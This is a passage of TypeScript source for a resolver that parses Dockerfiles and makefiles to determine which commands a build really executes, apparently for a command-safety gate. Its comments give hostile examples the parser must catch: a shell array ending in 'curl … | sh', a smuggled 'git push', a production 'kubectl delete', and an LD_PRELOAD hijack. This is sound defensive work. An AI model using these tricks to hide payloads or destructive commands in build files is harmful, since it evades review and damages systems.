  // `# escape=<char>` CHANGES THE LINE-CONTINUATION CHARACTER for the whole file — a documented directive whose
  // usual use is a backtick on Windows. Joining only backslash-newline left the continued half of a RUN as its
  // own line, which then matched nothing (exit review 8).
  const joined = text.replace(/\\\r?\n\s*/g, ' ');
  const out: string[] = [];
  for (const raw of joined.split('\n')) {
    const line = raw.replace(/^\s+/, '');
    if (!line) continue;
    // `SHELL ["/x","-c"]` RE-POINTS EVERY LATER `RUN` at that program, exactly as a makefile's `SHELL :=` does,
    // so the recipe text below it is not what determines the effect. `ONBUILD RUN …` records a command the CHILD
    // build runs; EGO can read it here and nowhere else, so it is classified here (exit review 8, self-attack).
    // `# syntax=<image>` makes BuildKit pull that image and let IT interpret the whole file, so the RUN lines
    // read here decide nothing at all (exit review 8).
    const syn = /^#\s*syntax\s*=\s*(\S+)/i.exec(line);
    if (syn) {
      out.push(`${MARK}dockerfile-shell frontend ${syn[1]!}`);
      continue;
    }
    if (line.startsWith('#')) continue;
    const sh = /^SHELL\s+(.+)$/i.exec(line);
    if (sh) {
      // THE WHOLE ARRAY IS THE SHELL, not its first element: `SHELL ["/bin/sh","-c","curl … | sh"]` puts an
      // ordinary interpreter in front of a payload that then runs before every later RUN (exit review 8).
      const argv = [...sh[1]!.matchAll(/"((?:[^"\\]|\\.)*)"/g)].map((m) => m[1]!);
      const prog = argv[0] ?? sh[1]!.trim().split(/\s+/)[0]!;
      const ordinary =
        (/^\/(bin|usr\/bin|usr\/local\/bin)\/(sh|bash|zsh|dash|ksh|ash)$/.test(prog) ||
          /^(sh|bash|zsh|dash|ksh|cmd|powershell|pwsh)$/.test(prog)) &&
        argv.slice(1).every((a) => /^-[a-zA-Z]+$/.test(a));
      if (!ordinary) out.push(`${MARK}dockerfile-shell ${argv.length > 1 ? argv.join(' ') : prog}`);
      continue;
    }
    const m = /^(?:ONBUILD\s+)?RUN\s+([\s\S]*)$/i.exec(line);
    if (!m) continue;
    let body = m[1]!.trim();
    // `RUN --mount=… cmd` and friends: the flags are the builder's, not the command's
    body = body.replace(/^(--[a-z-]+(=\S*)?\s+)*/i, '');
    const json = /^\[([\s\S]*)\]$/.exec(body);
    if (json) {
      try {
        const argv = JSON.parse(`[${json[1]!}]`) as unknown[];
        if (Array.isArray(argv) && argv.every((a) => typeof a === 'string')) {
          out.push(requote(argv as string[]));
          continue;
        }
      } catch {
        /* not JSON after all: fall through and treat it as shell */
      }
    }
    if (body) out.push(body);
  }
  return out;
}

/** The entries of a directory, or null when it cannot be read. A pattern whose directory is unreadable is a gap,
 *  not an empty set — the same rule the rest of this resolver follows for a positive claim. */
function listDirectory(dir: string): string[] | null {
  try {
    return readdirSync(dir);
  } catch {
    return null;
  }
}

/** make functions whose RESULT is text this resolver does not evaluate. Naming them is what makes an UNKNOWN
 *  function name opaque rather than text: positive claims must be earned here too. */
const MAKE_TEXT_FUNCTIONS = new Set([
  ...['subst', 'patsubst', 'strip', 'findstring', 'filter', 'filter-out', 'sort', 'word', 'wordlist', 'words'],
  ...['firstword', 'lastword', 'dir', 'notdir', 'suffix', 'basename', 'addsuffix', 'addprefix', 'join'],
  ...['wildcard', 'realpath', 'abspath', 'if', 'or', 'and', 'foreach', 'call', 'value', 'origin', 'flavor'],
  ...['error', 'warning', 'info', 'eval', 'file', 'let', 'intcmp'],
]);

/**
 * THE TEXT MAKE HANDS TO THE SHELL, and the commands it RUNS to get there.
 *
 * GNU make owns the `$` in a makefile. It expands its OWN `$(…)`, `${…}` and `$@`-style references and gives the
 * RESULT to `$(SHELL) -c`; `$$` is how a line writes one literal `$` FOR the shell. Handing the PRE-IMAGE to the
 * shell analyzer was wrong in both directions at once (exit review 4):
 *   - it OVER-gated, reading `echo $(VERSION)` as a command substitution of a command named VERSION;
 *   - it UNDER-gated, and that is the serious half. A variable's value is spliced in BEFORE the shell parses the
 *     line, so `EVIL := ; git push origin main` with a recipe `echo $(EVIL)` really does run the push. The shell's
 *     own `$VAR` is NOT re-parsed for control operators, and importing that reasoning into make made this ALLOW.
 *   - and `$(shell C)` RUNS C while make expands, for any target and even for `make -n`.
 * A single left-to-right scanner is the only shape that gets `$$` right: a chain of replacements cannot consume it
 * as a unit, so `$$$(shell …)` — which real make executes — slips through one of the passes.
 */
export function expandMakeText(
  text: string,
  vars: Map<string, string>,
  auto: Record<string, string> = {},
  depth = 0,
): { text: string | null; prefix: string; ran: string[] } {
  const ran: string[] = [];
  if (depth > 8) return { text: null, prefix: '', ran };
  let out = '';
  let prefix = ''; // what was determined BEFORE the first unknown: the head and the arguments up to it
  let opaque = false;
  // A REFERENCE INSIDE DOUBLE QUOTES CANNOT INTRODUCE OPERATORS. make splices the value in before the shell parses
  // the line, which is why an UNQUOTED reference really can carry a `;` and become new commands — but inside
  // quotes the same value is one word. Without this distinction the single most common release makefile,
  // `VERSION := $(shell git describe)` with `echo "building $(VERSION)"`, was opaque and asked (exit review 5).
  let inDouble = false;
  let inSingleQ = false;
  const unknownHere = (): void => {
    if (inDouble) out += '$MAKEVAR';
    else opaque = true;
  };
  const nameOnly = (v: string): string => v.slice(v.lastIndexOf('/') + 1);
  const dirOnly = (v: string): string => (v.includes('/') ? v.slice(0, v.lastIndexOf('/')) : '.');
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (ch === '\\' && text[i + 1] !== undefined) {
      out += ch + text[i + 1]!;
      if (!opaque) prefix = out;
      i++;
      continue;
    }
    // ...and a `'` suppresses the `"` inside it: toggling on every double quote without tracking single quotes
    // made `echo ' " ' $(UNDEFINED)` look like it was inside a string, so the undefined variable was treated as
    // quoted text rather than as the opaque splice make really performs (exit review 8)
    if (ch === "'" && !inDouble) inSingleQ = !inSingleQ;
    else if (ch === '"' && !inSingleQ) inDouble = !inDouble;
    if (ch !== '$') {
      out += ch;
      if (!opaque) prefix = out;
      continue;
    }
    const next = text[i + 1];
    if (next === '$') {
      out += '$'; // make emits ONE literal `$`: what follows is the SHELL's, so `$$(cmd)` is a substitution
      i++;
      continue;
    }
    if (next === undefined) {
      out += ch;
      continue;
    }
    if (next !== '(' && next !== '{') {
      const single = auto[next];
      if (single !== undefined) {
        out += single;
        if (!opaque) prefix = out;
        i++;
        continue;
      }
      const v = vars.get(next);
      if (v === undefined) unknownHere();
      else {
        const inner = expandMakeText(v, vars, auto, depth + 1);
        ran.push(...inner.ran);
        if (inner.text === null) unknownHere();
        else out += inner.text;
      }
      i++;
      continue;
    }
    const close = next === '(' ? ')' : '}';
    let d = 0;
    let j = i + 1;
    for (; j < text.length; j++) {
      if (text[j] === next) d++;
      else if (text[j] === close && --d === 0) break;
    }
    const body = text.slice(i + 2, j);
    i = j;
    const fn = /^([A-Za-z-]+)[ \t]+([\s\S]*)$/.exec(body);
    if (fn && (fn[1] === 'shell' || fn[1] === 'guile')) {
      // make RUNS this while expanding: the command is real execution, and the text it produces is not knowable
      const cmd = expandMakeText(fn[2]!, vars, auto, depth + 1);
      ran.push(...cmd.ran);
      if (cmd.text !== null && cmd.text.trim()) ran.push(cmd.text.trim());
      unknownHere(); // the command RAN; what it printed is not knowable
      continue;
    }
    if (fn && MAKE_TEXT_FUNCTIONS.has(fn[1]!)) {
      const arg = expandMakeText(fn[2]!, vars, auto, depth + 1); // a nested $(shell …) is still found
      ran.push(...arg.ran);
      unknownHere(); // the function's RESULT is not evaluated here
      continue;
    }
    const autoRef = /^([@<^+*?%])([DF])?$/.exec(body.trim());
    if (autoRef) {
      const v = auto[autoRef[1]!];
      if (v === undefined) unknownHere();
      else out += autoRef[2] === 'D' ? dirOnly(v) : autoRef[2] === 'F' ? nameOnly(v) : v;
      continue;
    }
    const name = body.trim();
    const value = vars.get(name);
    if (value !== undefined) {
      const inner = expandMakeText(value, vars, auto, depth + 1);
      ran.push(...inner.ran);
      if (inner.text === null) unknownHere();
      else {
        out += inner.text;
        if (!opaque) prefix = out;
      }
      continue;
    }
    // A VARIABLE THIS RESOLVER NEVER SAW DEFINED IS NOT PROVABLY EMPTY. make imports the whole environment and
    // accepts `make VAR=…` on the command line, so an undefined-looking name can carry anything at run time —
    // expanding it to nothing would turn a dynamic recipe into a proven-harmless one, which is the unearned
    // positive claim this kernel exists to refuse.
    unknownHere();
  }
  return { text: opaque ? null : out, prefix, ran };
}

/** Joins backslash continuations OUTSIDE recipe lines; a recipe's continuation stays one logical shell line. */
function makeLogicalLines(text: string): string[] {
  const raw = text.split(/\r?\n/);
  const out: string[] = [];
  for (let i = 0; i < raw.length; i++) {
    let line = raw[i]!;
    while (/\\$/.test(line) && i + 1 < raw.length) {
      // GNU make joins the continuation; inside a recipe the backslash-newline is handed to ONE shell, so the
      // joined text must stay a single line (challenge 5, finding 18: splitting it relocated relative paths).
      const next = raw[++i]!;
      line = line.replace(/\\$/, '') + (line.startsWith('\t') ? next.replace(/^\t/, ' ') : ' ' + next.trim());
    }
    out.push(line);
  }
  return out;
}

/**
 * Parses the subset of GNU make EGO models, following `include` directives and recording every construct it does
 * NOT model. Both branches of a conditional are kept: EGO cannot evaluate the condition, and analysing the union
 * is the safe direction — classifying only the last textually-visible recipe made `make ENV=prod build` ALLOW
 * while make executed the other branch (challenge 5, finding 15).
 */
/** A MAKE COMMAND LINE, READ THE WAY GNU MAKE'S OWN OPTION PARSER READS IT. Short options cluster and the last letter
 *  that takes a value takes the next word (`-kf other.mk`, `-sC sub`), long options may be abbreviated to any unique
 *  prefix (`--dir=sub`, `--fil x`), `-o`/`-W`/`-I` take a value that can look like a flag (`-o -n`), and `--` ends the
 *  options. The three scans this replaces (goals, `-C`/`-f`, and the dry-run/probe flags) each read a different
 *  subset of this and disagreed (exit review 10, self-attack: nine findings). */
interface MakeCommandLine {
  dirs: string[];
  files: string[];
  goals: string[];
  assignments: Array<[string, string]>;
  dryRun: boolean;
  question: boolean;
  probe: boolean;
  envOverrides: boolean;
  /** an option this parser does not know: the command line cannot be read with confidence */
  unknown: string | null;
  /** -E / --eval: makefile text supplied on the command line */
  injected: boolean;
}
const MAKE_LONG_OPTIONS: Array<{ name: string; value: 'none' | 'required' | 'optional-number'; effect?: string }> = [
  { name: 'directory', value: 'required', effect: 'dir' },
  { name: 'file', value: 'required', effect: 'file' },
  { name: 'makefile', value: 'required', effect: 'file' },
  { name: 'include-dir', value: 'required' },
  { name: 'old-file', value: 'required' },
  { name: 'assume-old', value: 'required' },
  { name: 'new-file', value: 'required' },
  { name: 'assume-new', value: 'required' },
  { name: 'what-if', value: 'required' },
  { name: 'jobs', value: 'optional-number' },
  { name: 'load-average', value: 'optional-number' },
  { name: 'max-load', value: 'optional-number' },
  { name: 'just-print', value: 'none', effect: 'dry' },
  { name: 'dry-run', value: 'none', effect: 'dry' },
  { name: 'recon', value: 'none', effect: 'dry' },
  { name: 'question', value: 'none', effect: 'question' },
  { name: 'environment-overrides', value: 'none', effect: 'env' },
  { name: 'version', value: 'none', effect: 'probe' },
  { name: 'help', value: 'none', effect: 'probe' },
  { name: 'eval', value: 'required', effect: 'inject' },
  { name: 'always-make', value: 'none' },
  { name: 'debug', value: 'optional-number' },
  { name: 'ignore-errors', value: 'none' },
  { name: 'keep-going', value: 'none' },
  { name: 'print-data-base', value: 'none' },
  { name: 'no-builtin-rules', value: 'none' },
  { name: 'no-builtin-variables', value: 'none' },
  { name: 'silent', value: 'none' },
  { name: 'quiet', value: 'none' },
  { name: 'no-keep-going', value: 'none' },
  { name: 'stop', value: 'none' },
  { name: 'touch', value: 'none' },
  { name: 'print-directory', value: 'none' },
  { name: 'no-print-directory', value: 'none' },
  { name: 'warn-undefined-variables', value: 'none' },
  { name: 'check-symlink-times', value: 'none' },
  { name: 'no-silent', value: 'none' },
  { name: 'trace', value: 'none' },
  { name: 'output-sync', value: 'optional-number' },
  { name: 'shuffle', value: 'optional-number' },
];
function parseMakeCommandLine(words: string[]): MakeCommandLine {
  const out: MakeCommandLine = {
    dirs: [], files: [], goals: [], assignments: [], dryRun: false, question: false, probe: false,
    envOverrides: false, unknown: null, injected: false,
  };
  const SHORT_VALUE = new Set(['C', 'f', 'I', 'o', 'W', 'E']);
  const SHORT_OPTIONAL_NUMBER = new Set(['j', 'l']);
  const SHORT_FLAGS = new Set(['b', 'm', 'B', 'd', 'e', 'h', 'i', 'k', 'L', 'n', 'p', 'q', 'r', 'R', 's', 'S', 't', 'v', 'w', 'O']);
  let optionsEnded = false;
  for (let i = 1; i < words.length; i++) {
    const w = words[i]!;
    if (!optionsEnded && w === '--') {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && w.startsWith('--')) {
      const eq = w.indexOf('=');
      const name = w.slice(2, eq < 0 ? undefined : eq);
      const hits = MAKE_LONG_OPTIONS.filter((o) => o.name === name);
      const cands = hits.length ? hits : MAKE_LONG_OPTIONS.filter((o) => o.name.startsWith(name));
      if (cands.length === 0 || (cands.length > 1 && new Set(cands.map((c) => `${c.value}:${c.effect ?? ''}`)).size > 1)) {
        out.unknown = w;
        continue;
      }
      const o = cands[0]!;
      let value: string | undefined = eq >= 0 ? w.slice(eq + 1) : undefined;
      if (o.value === 'required' && value === undefined) value = words[++i];
      else if (o.value === 'optional-number' && value === undefined && /^\d+(\.\d+)?$/.test(words[i + 1] ?? '')) value = words[++i];
      if (o.effect === 'dir' && value) out.dirs.push(value);
      else if (o.effect === 'file' && value) out.files.push(value);
      else if (o.effect === 'dry') out.dryRun = true;
      else if (o.effect === 'question') out.question = true;
      else if (o.effect === 'env') out.envOverrides = true;
      else if (o.effect === 'probe') out.probe = true;
      else if (o.effect === 'inject') out.injected = true;
      continue;
    }
    if (!optionsEnded && w.startsWith('-') && w.length > 1) {
      for (let k = 1; k < w.length; k++) {
        const c = w[k]!;
        if (SHORT_VALUE.has(c) || SHORT_OPTIONAL_NUMBER.has(c)) {
          const glued = w.slice(k + 1);
          let value: string | undefined = glued || undefined;
          if (value === undefined) {
            if (SHORT_VALUE.has(c)) value = words[++i];
            else if (/^\d+(\.\d+)?$/.test(words[i + 1] ?? '')) value = words[++i];
          }
          if (c === 'C' && value) out.dirs.push(value);
          else if (c === 'f' && value) out.files.push(value);
          else if (c === 'E') out.injected = true;
          break;
        }
        if (!SHORT_FLAGS.has(c)) {
          out.unknown = w;
          break;
        }
        if (c === 'n') out.dryRun = true;
        else if (c === 'q') out.question = true;
        else if (c === 'e') out.envOverrides = true;
        else if (c === 'h' || c === 'v') out.probe = true;
      }
      continue;
    }
    const eq = w.indexOf('=');
    if (eq > 0 && /^[A-Za-z_][A-Za-z0-9_.-]*$/.test(w.slice(0, eq))) out.assignments.push([w.slice(0, eq), w.slice(eq + 1)]);
    else out.goals.push(w.replace(/^(?:\.\/+)+/, ''));
  }
  return out;
}

function parseMakefile(ctx: EvaluationContext, path: string, dir: string, depth = 0): MakeFileModel {
  const model: MakeFileModel = {
    rules: new Map(),
    firstTarget: null,
    defaultGoal: null,
    altGoals: new Set<string>(),
    pendingIncludes: [],
    oneShell: false,
    unsupported: [],
    unsupportedFor: new Map(),
    hasPatternRules: false,
    targetVars: new Map(),
    overridden: new Set(),
    altVars: new Map(),
    exported: new Map(),
    patternRules: [],
    rebinds: [],
    vars: new Map(),
    parseRan: [],
    sources: [],
    text: '',
  };
  // every file this makefile includes, so a rule that REMAKES one — wherever that rule sits in the file — is
  // caught after the parse rather than only when the directive is read
  const included: string[] = [];
  const text = readInsideWorkspace(ctx, path);
  if (text === null) {
    model.unsupported.push(`${path} could not be read`);
    return model;
  }
  model.sources.push(path);
  model.text = text;
  const lines = makeLogicalLines(text);
  let current: MakeRule | null = null;
  const openConditions: string[] = [];
  // `define NAME` … `endef` holds a variable's VALUE. The lines between were fed through the ordinary loop, so
  // an assignment written inside a help text overwrote a live variable (exit review 8).
  let inDefine: { name: string; lines: string[]; override: boolean; exported: boolean; conditional: boolean } | null =
    null;
  // GNU make lets `.RECIPEPREFIX` replace the tab that introduces a recipe line. A parser that only knows the tab
  // sees an EMPTY recipe and reports the target fully resolved — its own gap becoming a positive claim.
  let prefix = '\t';
  for (const line of lines) {
    // A `define` BODY IS A VALUE, AND ITS LINES ARE READ AS ONE BEFORE ANYTHING ELSE. A tab-led line inside it is the
    // normal way to write a canned recipe, and the recipe-prefix test below took it for a recipe line of the
    // PREVIOUS rule: the variable came out empty and `$(CMD)` expanded to nothing. A `$(eval …)` inside the body
    // defines a rule when the variable is expanded, which no line-by-line reading sees (exit review 10, self-attack).
    if (inDefine !== null) {
      const t = line.trim();
      if (/^endef\b/.test(t)) {
        const prior = model.vars.get(inDefine.name);
        if (!(inDefine.conditional && prior !== undefined))
          model.vars.set(inDefine.name, inDefine.lines.join('\n').trim());
        if (inDefine.override) model.overridden.add(inDefine.name);
        if (inDefine.exported) model.exported.set(inDefine.name, inDefine.lines.join('\n').trim());
        inDefine = null;
      } else {
        if (/\$[({]eval\b/.test(t)) model.unsupported.push(`$(eval) inside define ${inDefine.name}: ${t}`);
        inDefine.lines.push(t);
      }
      continue;
    }
    // a line that starts with the CURRENT recipe prefix is a recipe line, whatever it says: a tab-indented
    // `.RECIPEPREFIX` is a command make hands to the shell, and reading it as a directive changed the prefix so
    // every remaining recipe line of that target became invisible (exit review 5)
    // `override` may precede it exactly as it may precede any other assignment (self-attack on exit review 9)
    const rp = line.startsWith(prefix)
      ? null
      : /^\s*(?:override\s+|export\s+)*\.RECIPEPREFIX\s*[:+?]?=\s*(\S?)/.exec(line);
    if (rp) {
      prefix = rp[1] || '\t'; // an empty assignment restores the tab
      current = null;
      continue;
    }
    if (line.startsWith(prefix)) {
      if (current) current.recipes.push(line.slice(prefix.length));
      continue;
    }
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    // `define NAME` … `endef` holds a variable's VALUE, not live makefile text. The lines between were fed
    // through the ordinary loop, so an assignment written inside a help text overwrote a live variable and the
    // recipe was analysed with the wrong one (exit review 8).
    const defOpen = /^((?:override\s+|export\s+)*)define\s+([A-Za-z_][A-Za-z0-9_.]*)\s*(::?=|[+?!]=|=)?\s*$/.exec(trimmed);
    if (defOpen) {
      inDefine = {
        name: defOpen[2]!,
        lines: [],
        override: /override/.test(defOpen[1]!),
        exported: /export/.test(defOpen[1]!),
        conditional: defOpen[3] === '?=',
      };
      continue;
    }

    // `include a.mk b.mk` — the included rules really execute, so an unreadable one is not "no such target"
    const inc = /^([-s]?)include\s+(.+)$/.exec(trimmed);
    if (inc && !/[$`]/.test(inc[2]!)) included.push(...inc[2]!.split(/\s+/).filter(Boolean));
    if (inc) {
      current = null;
      // `-include` and `sinclude` exist PRECISELY so that a missing file is not an error: make carries on. Marking
      // an absent optional include unsupported gated every ordinary `make build` in a project that generates its
      // dependency files (exit review 5). A file that IS there is still read and still counts.
      const optional = inc[1] === '-' || inc[1] === 's';
      if (/[$`]/.test(inc[2]!)) {
        model.unsupported.push(`include with a computed path: ${trimmed}`);
        continue;
      }
      if (depth >= 3) {
        model.unsupported.push('include nested deeper than this resolver follows');
        continue;
      }
      // A WILDCARD INCLUDE IS AN INCLUDE. `-include *.mk` is the idiom every dependency-generating project uses,
      // and make expands the pattern itself; the resolver read `*.mk` as a literal file name, found nothing, and
      // concluded the goal it did not see was proven absent. `evil.mk` holding `deploy: git push origin main`
      // then ran under a proven-absent claim (exit review 7).
      const names: string[] = [];
      for (const name of inc[2]!.split(/\s+/).filter(Boolean)) {
        if (!/[*?[]/.test(name)) {
          names.push(name);
          continue;
        }
        const globDir = resolve(dir, name.includes('/') ? name.slice(0, name.lastIndexOf('/')) : '.');
        const pattern = name.includes('/') ? name.slice(name.lastIndexOf('/') + 1) : name;
        const prefix = name.includes('/') ? name.slice(0, name.lastIndexOf('/') + 1) : '';
        const re = new RegExp('^' + pattern.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '[^/]') + '$');
        const listed = listDirectory(globDir);
        if (listed === null) {
          model.unsupported.push(`include with a pattern whose directory could not be read: ${trimmed}`);
          continue;
        }
        for (const entry of listed) if (re.test(entry)) names.push(prefix + entry);
        // A PATTERN INCLUDE TAKES WHATEVER MATCHES WHEN MAKE RUNS, and an earlier unit of the same command may
        // have created a file that matches it. The directory listing is a snapshot from BEFORE that write, so
        // the pattern itself is recorded and the producer tests it against the ledger (self-attack).
        model.pendingIncludes.push(resolve(dir, name));
      }
      for (const name of names) {
        // AN INCLUDED MAKEFILE THAT IS ITSELF A TARGET IS REMADE, and make then re-executes itself with the new
        // file. What EGO read is a PRE-IMAGE of what will run, so the file it read cannot carry a positive claim
        // (exit review 7).
        if (model.rules.has(name)) model.unsupported.push(`an included makefile is remade by this makefile: ${name}`);
        if (optional && !fileExists(resolve(dir, name))) {
          model.pendingIncludes.push(resolve(dir, name));
          continue;
        }
        const sub = parseMakefile(ctx, resolve(dir, name), dir, depth + 1);
        for (const [t, r] of sub.rules) {
          const existing = model.rules.get(t);
          if (existing) {
            existing.recipes.push(...r.recipes);
            existing.prereqs.push(...r.prereqs);
          } else model.rules.set(t, { recipes: [...r.recipes], prereqs: [...r.prereqs] });
        }
        for (const [k, v] of sub.vars) model.vars.set(k, v); // an included file's variables are this file's too
        // ...AND SO ARE ITS BRANCH VALUES, ITS TARGET-SPECIFIC VALUES, ITS OVERRIDES, ITS EXPORTS AND ITS
        // PATTERN RULES. The merge copied ten fields and dropped five, so an `ifeq` block or a
        // `deploy: GIT = …` line placed in an INCLUDED makefile was invisible while the identical line in the
        // main file was read — `include env.mk` was all it took (exit review 10). Merged here in the same shape
        // as the top-level file-merge loop, which had them all along.
        for (const [k, vs] of sub.altVars) {
          const into = model.altVars.get(k) ?? new Set<string>();
          for (const v of vs) into.add(v);
          model.altVars.set(k, into);
        }
        for (const [t, vars] of sub.targetVars) {
          const into = model.targetVars.get(t) ?? new Map<string, string>();
          for (const [k, v] of vars) into.set(k, v);
          model.targetVars.set(t, into);
        }
        for (const n of sub.overridden) model.overridden.add(n);
        for (const [k, v] of sub.exported) model.exported.set(k, v);
        model.patternRules.push(...sub.patternRules);
        model.parseRan.push(...sub.parseRan);
        model.unsupported.push(...sub.unsupported);
        for (const [t, u] of sub.unsupportedFor)
          model.unsupportedFor.set(t, [...(model.unsupportedFor.get(t) ?? []), ...u]);
        if (sub.hasPatternRules) model.hasPatternRules = true;
        model.rebinds.push(...sub.rebinds);
        model.sources.push(...sub.sources);
        if (sub.defaultGoal) model.defaultGoal = sub.defaultGoal; // make takes the LAST assignment
        for (const g of sub.altGoals) model.altGoals.add(g);
        model.pendingIncludes.push(...sub.pendingIncludes);
        if (sub.oneShell) model.oneShell = true;
        if (!model.firstTarget) model.firstTarget = sub.firstTarget;
      }
      continue;
    }
    // constructs whose effect this resolver cannot compute — recorded, never silently ignored
    if (/^(ifeq|ifneq|ifdef|ifndef|else|endif)\b/.test(trimmed)) {
      // make expands the CONDITION while parsing, so a shell function in it runs for every target and for a dry
      // run — and this branch returned before the parse-time collection below ever saw the line (exit review 5)
      for (const c of expandMakeText(trimmed, model.vars).ran) model.parseRan.push(c);
      if (/^endif\b/.test(trimmed)) openConditions.pop();
      else if (/^else\b/.test(trimmed)) openConditions[openConditions.length - 1] = `conditional: ${trimmed}`;
      else openConditions.push(`conditional: ${trimmed}`);
      // A CONDITIONAL DOES NOT END THE RULE IT SITS INSIDE. make allows `ifeq` at column 0 in the middle of a
      // recipe, and the recipe lines under it still belong to that target — clearing `current` dropped every one
      // of them, so the guarded branch of a real recipe simply disappeared (exit review 6). Both branches are
      // kept, which is the same rule this resolver already applies to a conditional around whole rules.
      continue;
    }
    if (/^(vpath|VPATH\s*[:+?]?=)/.test(trimmed)) model.unsupported.push(`VPATH: ${trimmed}`);
    // an assignment that redefines the interpreter or the lookup path for EVERY recipe line
    // a rebinding assignment can be global, `override`-ed, `export`-ed, or TARGET-SPECIFIC (`build: SHELL := x`),
    // and anchoring at line start saw only the first shape
    // `SHELL := /bin/bash` is the single most common line in a real makefile and names a system shell, not a
    // rebinding. Only an assignment naming something ELSE — a relative path, a repository program, a variable —
    // re-points what the recipe runs. Treating every SHELL assignment as a rebind made every target of every
    // such makefile ask (exit review 2).
    // `build:: SHELL = …` is a target-specific rebind on a DOUBLE-COLON rule, and the optional target prefix
    // matched only a single colon; `SHELL != …` and `SHELL ::= …` are the same rebind by another operator.
    const assign = /^(?:[^:=#]+::?\s*)?(?:override\s+|export\s+)*(SHELL|\.SHELLFLAGS|PATH)\s*(?:::?|[+?!])?=\s*(.*)$/.exec(
      trimmed,
    );
    if (assign && !isOrdinaryShellAssignment(assign[1]!, assign[2]!)) model.rebinds.push(trimmed);
    // EVERY variable, not only the ones that rebind execution: a recipe's `$(VAR)` is substituted with the value
    // make will splice in, and a value carrying `;` or `&&` really does become new commands (exit review 4).
    // `export NAME` ON ITS OWN LINE exports a variable assigned elsewhere. Only the combined `export NAME=value`
    // form was read, so `LD_PRELOAD := ./evil.so` followed by `export LD_PRELOAD` re-pointed every program the
    // recipe runs while nothing recorded it (self-attack on exit review 9).
    const bareExport = /^(?:override\s+)?export\s+([A-Za-z_][A-Za-z0-9_.]*)\s*$/.exec(trimmed);
    if (bareExport) {
      const v = model.vars.get(bareExport[1]!);
      if (v !== undefined) model.exported.set(bareExport[1]!, v);
      current = null;
      continue;
    }
    const anyAssign = /^(?:override\s+|export\s+|unexport\s+)*([A-Za-z_][A-Za-z0-9_.]*)\s*(::?=|[+?!]=|=)\s*([\s\S]*)$/.exec(
      trimmed,
    );
    if (anyAssign) {
      const [, name, op, value] = anyAssign as unknown as [string, string, string, string];
      // `?=` IS CONDITIONAL: it sets the variable only when it has no value yet. Treating it as a plain set let
      // `KUBECTL = <production delete>` be overwritten by a following `KUBECTL ?= echo skipped`, and the recipe
      // was analysed with the harmless value while make ran the real one (exit review 8).
      if (op === '?=' && model.vars.has(name)) continue;
      // ...and INSIDE A CONDITIONAL, EVERY BRANCH IS POSSIBLE. The resolver keeps both branches on purpose,
      // because it cannot always evaluate the condition — so neither the first nor the last assignment may be
      // the only one considered. `ifeq ($(ENV),)` / `CMD = <production delete>` / `else` / `CMD = echo local`
      // was analysed as `echo local` while make, with ENV unset, ran the delete (exit review 8); keeping only
      // the first would lose the mirror case, where the effect is in the `else`. Both values are recorded and
      // the recipe is expanded with each.
      if (openConditions.length) {
        const alts = model.altVars.get(name) ?? new Set<string>();
        const prior = model.vars.get(name);
        if (prior !== undefined) alts.add(prior);
        alts.add(value);
        model.altVars.set(name, alts);
      }
      // `override VAR = …` INVERTS make's precedence: the makefile's value wins over `make VAR=…`. Applying the
      // command line last regardless let an attacker-written recipe be read with the operator's harmless value —
      // `make KUBECTL=true ship` was analysed as `true …` while make really ran the makefile's `kubectl
      // --context prod delete deploy api` (exit review 7).
      if (/^override\s/.test(trimmed)) model.overridden.add(name);
      if (/^(export|override\s+export)\s/.test(trimmed)) model.exported.set(name, value);
      const prior = model.vars.get(name);
      // `:=` and `::=` are SIMPLY EXPANDED: the value is fixed HERE, so a later assignment to what it referenced
      // does not change it. Storing the text and expanding it lazily gave every variable recursive flavour, and
      // `B := $(A)` then read A's LAST value rather than its value at this line (exit review 5).
      const simple = op === ':=' || op === '::=';
      const text = simple ? (expandMakeText(value, model.vars).text ?? value) : value;
      model.vars.set(name, op === '+=' && prior !== undefined ? `${prior} ${text}` : text);
      // an assignment expands its right-hand side NOW when it is simply expanded, so a shell function there runs
      if (simple) for (const c of expandMakeText(value, model.vars).ran) model.parseRan.push(c);
      // `X != CMD` IS `$(shell CMD)` BY ANOTHER NAME. GNU make's shell-assignment operator runs the right-hand
      // side through the shell WHILE PARSING — for any goal, and under `make -n` — and the value was being
      // stored as inert text, so `X != git push origin main` pushed and nothing recorded it (exit review 7).
      if (op === '!=') {
        const rhs = expandMakeText(value, model.vars);
        model.parseRan.push(...rhs.ran);
        if (rhs.text !== null && rhs.text.trim()) model.parseRan.push(rhs.text.trim());
        else if (value.trim()) model.parseRan.push(value.trim());
      }
    }
    // `$(shell …)` ANYWHERE outside a recipe runs while make PARSES — for every target, and for `make -n`
    for (const c of expandMakeText(trimmed, model.vars).ran) model.parseRan.push(c);
    // GNU make reads `${…}` and `$(…)` as the SAME reference, and the guard saw only the paren form
    if (/\$[({]eval\b/.test(trimmed)) model.unsupported.push(`$(eval): ${trimmed}`);
    // GNU make >= 4.0 `load FILE` (and `-load`) DLOPENS a shared object at MAKEFILE-PARSE time and calls its setup
    // function: native code in make's own process, for every goal and before any recipe, regardless of `-n`. It is
    // the third way a makefile executes at parse time and the only one that is not shell at all, so no
    // shell-shaped check could have seen it (exit review 10). It is a construct the resolver cannot follow.
    if (/^-?load\s+\S/.test(trimmed)) {
      model.unsupported.push(`load directive: ${trimmed}`);
      current = null;
      continue;
    }
    if (/^\.ONESHELL\s*:/.test(trimmed)) {
      // the WHOLE recipe goes to one shell, so a `cd` on one line leaks into the next
      model.oneShell = true;
      current = null;
      continue;
    }
    // `override` and `export` may precede it, exactly as they may precede any other assignment: without them
    // `override .DEFAULT_GOAL = deploy` selected no goal at all (exit review 9).
    const goal = /^(?:override\s+|export\s+)*\.DEFAULT_GOAL\s*[:+?]?=\s*(\S+)/.exec(trimmed);
    if (goal) {
      // INSIDE A CONDITIONAL, EVERY BRANCH IS POSSIBLE — the same rule `altVars` applies to an ordinary
      // variable. Outside one, assignments are SEQUENTIAL and make takes the last, which this resolver can
      // determine exactly; recording every sequential assignment as a candidate would walk goals the file has
      // already overwritten and gate a makefile EGO can read perfectly well.
      const g = goal[1]!.replace(/^(?:\.\/+)+/, '') || goal[1]!;
      if (openConditions.length) {
        if (model.defaultGoal) model.altGoals.add(model.defaultGoal);
        model.altGoals.add(g);
        // ...AND IF THE CONDITION IS FALSE THE ASSIGNMENT NEVER HAPPENS, so make falls back to the FIRST RULE.
